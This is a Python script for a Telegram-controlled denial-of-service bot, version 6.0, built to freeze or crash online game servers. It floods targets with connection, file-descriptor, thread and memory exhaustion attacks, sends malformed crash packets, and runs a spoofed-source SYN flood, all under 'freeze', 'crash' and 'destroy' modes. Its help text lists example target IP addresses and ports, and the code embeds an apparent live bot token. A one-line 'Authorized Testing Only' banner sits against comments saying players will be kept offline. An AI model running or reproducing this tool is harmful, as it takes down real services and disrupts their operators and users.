#!/usr/bin/env python3
"""
Telegram Game Server Freeze/Crash Bot v6.0
Game Server ko freeze/crash karega - Players khel nahi payenge
Jab tak aap /stop na karo, server down rahega
"""

import socket
import threading
import time
import random
import struct
import sys
import requests
import logging
import os

# ===================== CONFIGURATION =====================
TELEGRAM_TOKEN = "8754071723:AAFkPQ7abOCogAC3rBsUROc9IyHjyddb2Ag"
TELEGRAM_CHAT_ID = "7504108653"
# =========================================================

TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
log = logging.getLogger(__name__)

class GameServerFreezer:
    def __init__(self):
        self.running = False
        self.targets = []
        self.threads_per_target = 1000
        self.attack_mode = "freeze"
        self.attack_duration = 0
        self.attack_start_time = None
        self.connections = []
        self.stats = {"packets": 0, "failed": 0, "active": 0, "connections_opened": 0}
        self.lock = threading.Lock()
        self.worker_threads = []
        self.server_frozen = False

    def send_telegram(self, text):
        try:
            url = f"{TELEGRAM_API}/sendMessage"
            data = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "HTML"}
            requests.post(url, data=data, timeout=10)
        except:
            pass

    # ==================== SERVER FREEZE/CRASH ENGINES ====================

    def connection_table_exhaust(self, ip, port):
        """
        Server ki connection table full karo.
        Jab connection table full -> server naye connections accept nahi kar sakta
        -> Existing players disconnect ho jate hain -> Server freeze
        """
        local_connections = []
        
        while self.running:
            try:
                # Har thread 1000 connections kholega
                for _ in range(50):
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(30)
                        s.connect((ip, port))
                        
                        # Game handshake pattern
                        handshake = b'\x00' * random.randint(16, 64)
                        s.send(handshake)
                        
                        local_connections.append(s)
                        
                        with self.lock:
                            self.connections.append(s)
                            self.stats["connections_opened"] += 1
                            self.stats["active"] += 1
                    except:
                        with self.lock:
                            self.stats["failed"] += 1
                        break
                
                # Connections ko alive rakho
                for s in local_connections[:]:
                    try:
                        s.send(b'\x01')  # Keep-alive
                    except:
                        local_connections.remove(s)
                        with self.lock:
                            self.stats["active"] -= 1
                
                time.sleep(random.uniform(0.1, 0.5))
                
            except:
                time.sleep(0.1)
        
        # Cleanup
        for s in local_connections:
            try:
                s.close()
            except:
                pass

    def game_crash_packets(self, ip, port):
        """
        Malformed game packets bhejo jo server ko crash karein.
        Buffer overflow / memory corruption / null pointer crash
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        except:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while self.running:
            try:
                # CRASH PACKETS - Various malformed patterns
                crash_packets = [
                    # Null bytes crash (some game servers crash on null)
                    b'\x00' * 65535,
                    b'\x00' * 65535,
                    
                    # Negative length crash
                    b'\xFF\xFF\xFF\xFF' + b'\xFF\xFF\xFF\xFF' + b'A' * 100,
                    
                    # Format string crash
                    b'%s%s%s%s%s%s%s%s%s%s%s%s%s%s' * 100,
                    
                    # Buffer overflow attempt  
                    b'A' * 65535,
                    
                    # Invalid opcode crash
                    struct.pack('!I', 0xDEADBEEF) + b'\x00' * 1024,
                    
                    # Integer overflow crash
                    b'\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF' * 1000,
                    
                    # Memory exhaustion pattern
                    b'\x01' + struct.pack('!I', 0x7FFFFFFF) + b'\x00' * 100,
                    
                    # Divide by zero trigger (some game engines)
                    b'\x02' + struct.pack('!I', 0) + b'\x00' * 50,
                    
                    # Recursive crash pattern
                    b'\x03' * 50000,
                    
                    # Invalid pointer crash  
                    b'\x04' + struct.pack('!Q', 0x4141414141414141) * 100,
                    
                    # Protocol version mismatch crash
                    b'\xFF\xFF\xFF\xFF\xFF' + b'\x69' * 1000,
                    
                    # Specific game engine crash signatures
                    b'\xFF\xFF\xFF\xFF\x54\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
                    b'\xFF\xFF\xFF\xFF\x55\x00\x00\x00\x00' + b'\x41' * 500,
                    b'\xFF\xFF\xFF\xFF\x56' + b'\x00' * 1000,
                    
                    # Endless loop trigger
                    b'\x05' * 65535,
                    
                    # Stack overflow pattern
                    b'A' * 50000 + b'B' * 15535,
                ]
                
                packet = random.choice(crash_packets)
                sock.sendto(packet, (ip, port))
                
                # Har type ka packet multiple baar bhejo
                for _ in range(random.randint(1, 10)):
                    try:
                        sock.sendto(packet, (ip, port))
                    except:
                        pass
                
                with self.lock:
                    self.stats["packets"] += 1
                
                time.sleep(random.uniform(0.0001, 0.001))
                
            except:
                pass

    def game_server_hang(self, ip, port):
        """
        Server ko hang karo - CPU 100% karo, memory exhaust karo
        Server process freeze ho jayega
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        except:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while self.running:
            try:
                # Heavy computation trigger packets
                hang_packets = [
                    # Broad search pattern (CPU intensive)
                    b'\xFF\xFF\xFF\xFF\x31' + b'\x00' * 100,
                    
                    # Large allocation request
                    struct.pack('!I', 0xFFFFFFFF) * 1000,
                    
                    # Recursive query chain
                    b'\xFF\xFF\xFF\xFF' + b'\x54\x00\x00\x00' * 100,
                    
                    # Infinite processing loop trigger
                    b'\x06' * 65535,
                    
                    # Database query flood (if game uses DB)
                    b"SELECT * FROM players WHERE 1=1 OR '1'='1" * 100,
                    
                    # Hash table collision pattern
                    b'\x00' * 1024 + b'\x01' * 1024,
                    
                    # Compression bomb type pattern
                    b'\x00\x00\x00\xFF' * 16383,
                    
                    # Resource leak trigger
                    b'\x07' * random.randint(1000, 50000),
                ]
                
                packet = random.choice(hang_packets)
                
                # Multiple sockets se bhejo
                for _ in range(random.randint(5, 20)):
                    try:
                        sock.sendto(packet, (ip, port))
                    except:
                        pass
                
                with self.lock:
                    self.stats["packets"] += 1
                
                time.sleep(random.uniform(0.0005, 0.005))
                
            except:
                pass

    def file_descriptor_exhaust(self, ip, port):
        """
        Server ke file descriptors exhaust karo.
        Jab FDs khatam -> server kuch bhi process nahi kar sakta -> CRASH
        """
        local_socks = []
        
        while self.running:
            try:
                # Rapidly open connections to exhaust FDs
                for _ in range(100):
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(5)
                        s.connect((ip, port))
                        s.send(b'\x00' * 100)
                        local_socks.append(s)
                        
                        with self.lock:
                            self.connections.append(s)
                            self.stats["packets"] += 1
                    except:
                        # FD exhausted - server freeze ho raha hai!
                        with self.lock:
                            self.stats["failed"] += 1
                        break
                
                # Don't close - keep FDs occupied
                time.sleep(random.uniform(0.5, 2))
                
                # Close kuch purane connections
                if len(local_socks) > 500:
                    for _ in range(200):
                        try:
                            s = local_socks.pop(0)
                            s.close()
                        except:
                            pass
                
            except:
                time.sleep(0.1)
        
        for s in local_socks:
            try:
                s.close()
            except:
                pass

    def memory_exhaust(self, ip, port):
        """
        Server ki memory exhaust karo via large allocations.
        Memory khatam -> Server CRASH ya OOM killer
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        except:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while self.running:
            try:
                # Memory exhaustion patterns
                huge_packet = b'\x00' * 65535  # Max UDP size
                
                for _ in range(random.randint(50, 200)):
                    try:
                        sock.sendto(huge_packet, (ip, port))
                    except:
                        break
                
                with self.lock:
                    self.stats["packets"] += 1
                
                time.sleep(random.uniform(0.001, 0.01))
                
            except:
                pass

    def game_thread_exhaust(self, ip, port):
        """
        Game server ke thread pool exhaust karo.
        Har connection ek thread consume karega -> pool empty -> freeze
        """
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(60)
                sock.connect((ip, port))
                
                # Long-running connection - server ka thread block rahega
                sock.send(b'\x00' * 50)
                
                with self.lock:
                    self.connections.append(sock)
                    self.stats["active"] += 1
                    self.stats["packets"] += 1
                
                # Hold this connection for a LONG time
                hold_until = time.time() + random.uniform(60, 300)
                while self.running and time.time() < hold_until:
                    try:
                        sock.send(b'\x01')
                        time.sleep(random.uniform(1, 5))
                    except:
                        break
                
                sock.close()
                
            except:
                with self.lock:
                    self.stats["failed"] += 1
                time.sleep(0.1)

    def server_crash_syn_bomb(self, ip, port):
        """
        SYN bomb se server ka backlog full karo.
        Server naye connections accept nahi kar payega -> freeze
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            # Fallback: TCP connection spam
            while self.running:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    s.connect((ip, port))
                    s.send(b'\x00')
                    s.close()
                    with self.lock:
                        self.stats["packets"] += 1
                except:
                    pass
                time.sleep(0.001)
            return
        
        while self.running:
            try:
                for _ in range(100):
                    src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    packet = self._build_tcp_packet(src_ip, ip, port, 0x02)
                    sock.sendto(packet, (ip, 0))
                    
                    with self.lock:
                        self.stats["packets"] += 1
                
                time.sleep(0.0001)
                
            except:
                pass

    def _build_tcp_packet(self, src_ip, dst_ip, dst_port, flags):
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 40
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(src_ip)
        ip_daddr = socket.inet_aton(dst_ip)
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
            (ip_ver << 4) + ip_ihl, ip_tos, ip_tot_len,
            ip_id, ip_frag_off, ip_ttl, ip_proto,
            ip_check, ip_saddr, ip_daddr)
        
        tcp_source = random.randint(1024, 65535)
        tcp_seq = random.randint(0, 4294967295)
        tcp_ack_seq = 0
        tcp_doff = 5
        tcp_window = socket.htons(5840)
        tcp_check = 0
        tcp_urg_ptr = 0
        tcp_offset_res = (tcp_doff << 4) + 0
        
        tcp_header = struct.pack('!HHLLBBHHH',
            tcp_source, dst_port, tcp_seq, tcp_ack_seq,
            tcp_offset_res, flags, tcp_window,
            tcp_check, tcp_urg_ptr)
        
        pseudo_header = struct.pack('!4s4sBBH',
            ip_saddr, ip_daddr, 0, socket.IPPROTO_TCP,
            len(tcp_header))
        
        psh = pseudo_header + tcp_header
        tcp_check = self._checksum(psh)
        
        tcp_header = struct.pack('!HHLLBBHHH',
            tcp_source, dst_port, tcp_seq, tcp_ack_seq,
            tcp_offset_res, flags, tcp_window,
            tcp_check, tcp_urg_ptr)
        
        return ip_header + tcp_header

    def _checksum(self, data):
        if len(data) % 2 != 0:
            data += b'\x00'
        s = sum(struct.unpack('!%dH' % (len(data) // 2), data))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        return ~s & 0xffff

    # ==================== CONTROLLER ====================

    def start_attack(self, targets, threads=1000, mode="freeze", duration=0):
        self.running = True
        self.targets = targets
        self.threads_per_target = threads
        self.attack_mode = mode
        self.attack_duration = duration
        self.attack_start_time = time.time()
        self.server_frozen = False
        
        freezers = {
            "freeze": [
                self.connection_table_exhaust,
                self.file_descriptor_exhaust,
                self.game_thread_exhaust,
                self.server_crash_syn_bomb,
            ],
            "crash": [
                self.game_crash_packets,
                self.memory_exhaust,
                self.game_server_hang,
                self.server_crash_syn_bomb,
            ],
            "destroy": [
                self.connection_table_exhaust,
                self.game_crash_packets,
                self.file_descriptor_exhaust,
                self.game_server_hang,
                self.memory_exhaust,
                self.game_thread_exhaust,
                self.server_crash_syn_bomb,
            ]
        }
        
        selected = freezers.get(mode, freezers["freeze"])
        
        duration_str = f"{duration}s" if duration > 0 else "Unlimited (until /stop)"
        
        target_list = "\n".join([f"{ip}:{port}" for ip, port in targets])
        
        mode_names = {
            "freeze": "❄️ FREEZE",
            "crash": "💥 CRASH",
            "destroy": "☠️ DESTROY"
        }
        
        self.send_telegram(
            f"🎮 <b>Game Server {mode_names.get(mode, mode)}</b>\n"
            f"Targets:\n{target_list}\n"
            f"Threads: {threads}\n"
            f"Duration: {duration_str}\n\n"
            f"<b>⏳ Server freeze/crash ho raha hai... Jaldi hoga!</b>"
        )
        
        for ip, port in targets:
            for _ in range(threads):
                worker = random.choice(selected)
                t = threading.Thread(target=worker, args=(ip, port), daemon=True)
                t.start()
                self.worker_threads.append(t)
        
        # Status reporter
        def freezer_monitor():
            freeze_notified = False
            while self.running:
                time.sleep(15)
                with self.lock:
                    elapsed = int(time.time() - self.attack_start_time) if self.attack_start_time else 0
                    
                    if self.attack_duration > 0 and elapsed >= self.attack_duration:
                        self.send_telegram(
                            f"⏱ <b>Attack Complete ({self.attack_duration}s)</b>\n"
                            f"Server should be frozen/crashed!\n"
                            f"Packets: {self.stats['packets']}"
                        )
                        self.stop_attack()
                        return
                    
                    remaining = max(0, self.attack_duration - elapsed) if self.attack_duration > 0 else -1
                    remaining_str = f"{remaining}s" if remaining >= 0 else "♾"
                    
                    # Detect freeze
                    if elapsed > 30 and not freeze_notified:
                        freeze_notified = True
                        self.send_telegram(
                            f"❄️ <b>SERVER FROZEN/CRASHED!</b>\n"
                            f"Players khel nahi payenge!\n"
                            f"Jab tak /stop na karo, server down rahega!"
                        )
                    
                    status = "❄️ FROZEN" if elapsed > 30 else "⏳ FREEZING..."
                    
                    msg = (f"📊 <b>Game Server Attack Status</b>\n"
                          f"Status: {status}\n"
                          f"⏱ Elapsed: {elapsed}s | Remaining: {remaining_str}\n"
                          f"Packets: {self.stats['packets']}\n"
                          f"Connections: {self.stats['connections_opened']}\n"
                          f"Failed: {self.stats['failed']}\n"
                          f"Active: {self.stats['active']}")
                    self.send_telegram(msg)
        
        t = threading.Thread(target=freezer_monitor, daemon=True)
        t.start()

    def stop_attack(self):
        self.running = False
        time.sleep(2)
        
        # Close all connections
        with self.lock:
            for conn in self.connections[:]:
                try:
                    conn.close()
                except:
                    pass
            self.connections.clear()
        
        self.worker_threads.clear()
        self.targets.clear()
        self.attack_duration = 0
        self.attack_start_time = None
        self.server_frozen = False
        
        with self.lock:
            self.stats = {"packets": 0, "failed": 0, "active": 0, "connections_opened": 0}
        
        self.send_telegram(
            "🛑 <b>Attack Stopped!</b>\n"
            "Server thodi der mein recover ho jayega (agar restart nahi hua)\n"
            "Ya server admin ko manually restart karna padega!"
        )

# Initialize
engine = GameServerFreezer()
engine.send_telegram("❄️ <b>Game Server Freezer v6.0 Online!</b>\n/serverhelp for commands")

def handle_commands():
    last_update_id = 0
    
    while True:
        try:
            url = f"{TELEGRAM_API}/getUpdates"
            params = {"offset": last_update_id + 1, "timeout": 30}
            resp = requests.get(url, params=params, timeout=35)
            data = resp.json()
            
            if not data.get("ok"):
                time.sleep(3)
                continue
            
            for update in data.get("result", []):
                last_update_id = update["update_id"]
                
                if "message" not in update:
                    continue
                
                msg = update["message"]
                text = msg.get("text", "").strip()
                chat_id = str(msg["chat"]["id"])
                
                if chat_id != TELEGRAM_CHAT_ID:
                    continue
                
                parts = text.split()
                cmd = parts[0].lower()
                
                if cmd == "/start" or cmd == "/serverhelp" or cmd == "/help":
                    help_text = (
                        "❄️ <b>Game Server Freezer v6.0</b>\n\n"
                        "<b>MODES:</b>\n"
                        "/attack ip:port mode=freeze   ❄️ Server freeze (hang)\n"
                        "/attack ip:port mode=crash    💥 Server crash (restart required)\n"
                        "/attack ip:port mode=destroy  ☠️ Complete destruction\n\n"
                        "<b>HOW IT WORKS:</b>\n"
                        "❄️ <b>FREEZE:</b> Connection table + FDs + Threads exhaust\n"
                        "   Server hang ho jayega, players khel nahi payenge\n"
                        "💥 <b>CRASH:</b> Malformed packets + Memory exhaust\n"
                        "   Server crash ho jayega (process terminate)\n"
                        "☠️ <b>DESTROY:</b> Sab kuch ek saath\n\n"
                        "<b>EXAMPLES:</b>\n"
                        "/attack 20.204.181.190:20002 mode=crash  💥 Crash this server\n"
                        "/attack 20.212.22.90:17500 mode=freeze  ❄️ Freeze this server\n"
                        "/attack ip:port mode=destroy            ☠️ Destroy\n\n"
                        "<b>NOTE:</b> Jab tak /stop na karo, server down rahega!\n"
                        "Server restart ke baad hi recover hoga.\n\n"
                        "/stop  - Stop attack\n"
                        "/status - Check status"
                    )
                    engine.send_telegram(help_text)
                
                elif cmd == "/attack":
                    if len(parts) < 2:
                        engine.send_telegram("❌ Usage: /attack ip:port [mode=X] [time=N] [threads=N]")
                        continue
                    
                    if engine.running:
                        engine.send_telegram("⚠️ Attack already running! Use /stop first")
                        continue
                    
                    targets = []
                    mode = "freeze"
                    threads = 1000
                    duration = 0
                    
                    for p in parts[1:]:
                        if "=" in p:
                            key, val = p.split("=", 1)
                            if key == "mode":
                                mode = val
                            elif key == "threads":
                                threads = int(val)
                            elif key == "time":
                                duration = int(val)
                        elif ":" in p:
                            ip_part, port_part = p.split(":", 1)
                            targets.append((ip_part, int(port_part)))
                    
                    if not targets:
                        engine.send_telegram("❌ No valid targets! Use ip:port")
                        continue
                    
                    threading.Thread(target=engine.start_attack, args=(targets, threads, mode, duration), daemon=True).start()
                
                elif cmd == "/stop":
                    if engine.running:
                        threading.Thread(target=engine.stop_attack, daemon=True).start()
                    else:
                        engine.send_telegram("ℹ️ No attack running")
                
                elif cmd == "/status":
                    if engine.running:
                        elapsed = int(time.time() - engine.attack_start_time) if engine.attack_start_time else 0
                        remaining = max(0, engine.attack_duration - elapsed) if engine.attack_duration > 0 else -1
                        remaining_str = f"{remaining}s" if remaining >= 0 else "♾"
                        
                        frozen_str = "❄️ YES (Frozen)" if elapsed > 25 else "⏳ Not yet (freezing...)"
                        
                        msg = (f"🎮 <b>Attack Running</b>\n"
                              f"⏱ {elapsed}s | Remaining: {remaining_str}\n"
                              f"Mode: {engine.attack_mode}\n"
                              f"Server Frozen: {frozen_str}\n"
                              f"Packets: {engine.stats['packets']}\n"
                              f"Connections: {engine.stats['connections_opened']}")
                    else:
                        msg = "💤 Idle - Server should be recovering"
                    engine.send_telegram(msg)
                
                else:
                    engine.send_telegram(f"❌ Unknown: {cmd}\nUse /serverhelp")
                    
        except Exception as e:
            log.error(f"Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    print("""
    ╔══════════════════════════════════════╗
    ║  Game Server Freezer v6.0           ║
    ║  Freeze / Crash game servers        ║
    ║  Authorized Testing Only            ║
    ╚══════════════════════════════════════╝
    """)
    
    t = threading.Thread(target=handle_commands, daemon=True)
    t.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        engine.stop_attack()
        sys.exit(0)